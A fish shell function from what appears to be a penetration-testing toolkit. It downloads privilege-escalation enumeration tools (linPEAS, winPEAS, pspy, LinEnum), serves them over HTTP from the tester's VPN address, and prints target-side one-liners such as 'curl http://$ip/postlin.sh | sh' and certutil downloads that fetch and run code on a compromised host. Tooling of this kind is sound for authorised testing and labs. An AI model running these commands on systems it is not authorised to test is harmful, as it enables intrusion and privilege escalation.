# ~/.config/fish/functions/pwncat.fish
function pwncat --description "fetch privesc tools and serve them over HTTP"
    set -l dir ~/tools
    mkdir -p $dir

    # name => url
    set -l names linpeas.sh winPEAS.exe winPEASx64.exe pspy64 pspy32 linenum.sh
    set -l urls \
        https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh \
        https://github.com/peass-ng/PEASS-ng/releases/latest/download/winPEASany.exe \
        https://github.com/peass-ng/PEASS-ng/releases/latest/download/winPEASx64.exe \
        https://github.com/DominicBreuker/pspy/releases/latest/download/pspy64 \
        https://github.com/DominicBreuker/pspy/releases/latest/download/pspy32 \
        https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh

    # not wrapped in __run: fetching tools onto your own box is setup, not an
    # action against the target, and it only happens once anyway
    for i in (seq (count $names))
        if not test -f $dir/$names[$i]
            echo "[*] fetching $names[$i]"
            curl -sSL $urls[$i] -o $dir/$names[$i]
        end
    end
    # postlin.sh ships with rasbora (install.sh copies it next to the functions).
    # Copy it into the served dir so it goes out like the downloaded tools.
    for cand in (dirname (status filename))/postlin.sh ~/.rasbora/postlin.sh
        if test -f $cand
            cp $cand $dir/postlin.sh
            break
        end
    end

    chmod +x $dir/* 2>/dev/null

    set -l ip (ip -4 addr show tun0 2>/dev/null | grep -oP 'inet \K[\d.]+')
    test -z "$ip"; and set ip (ip -4 addr show scope global | grep -oP 'inet \K[\d.]+' | head -1)

    echo
    echo "  linux:   curl http://$ip/postlin.sh | sh        # rasbora: verdict-first, read section 8 first"
    echo "           curl http://$ip/linpeas.sh | sh         # then this for what postlin misses, read bottom-up"
    echo "           wget http://$ip/pspy64 -O /tmp/p; chmod +x /tmp/p; /tmp/p"
    echo "  windows: certutil -urlcache -f http://$ip/winPEASx64.exe w.exe"
    echo "           iwr http://$ip/winPEASx64.exe -o w.exe"
    echo

    # --directory instead of cd: serving no longer strands your shell in ~/tools
    __run sudo python3 -m http.server 80 --directory $dir
end
